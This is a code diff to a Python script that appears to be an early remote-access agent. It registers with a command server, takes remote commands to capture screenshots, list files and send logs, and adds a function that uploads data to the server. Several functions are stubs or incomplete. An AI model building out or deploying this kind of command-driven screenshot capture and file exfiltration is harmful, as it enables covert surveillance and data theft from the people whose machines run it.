@@ -10,6 +10,7 @@ import socket
 import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 import screenshot
+import config
 
 agent_id = str(uuid.uuid4())
 SERVER_URL = "http://localhost:5000"
@@ -29,6 +30,10 @@ def run_server():
                 #send screenshot logic
                 if data['command'] == "screenshot":
                     screenshot.log_screenshot()
+                elif data['command'] == "list_files":
+                    config.get_files()
+                elif data['command'] == "send_log":
+                    config.send_log()
 
                 # Send a successful response
                 self.send_response(200)
@@ -83,7 +88,15 @@ def register():
     response = requests.post(f"{SERVER_URL}/register", json=data_dict)
     json_data = response.text
     print(json_data)
-    
+
+def list_files(path):
+    pass
+
+def send_file(path):
+    response = requests.post(f"{SERVER_URL}/upload", data=path)
+    data = response.text
+    print(data)
+
 def get_mac():
     # Returns the 48-bit integer representation of the MAC address
     mac_num = uuid.getnode()
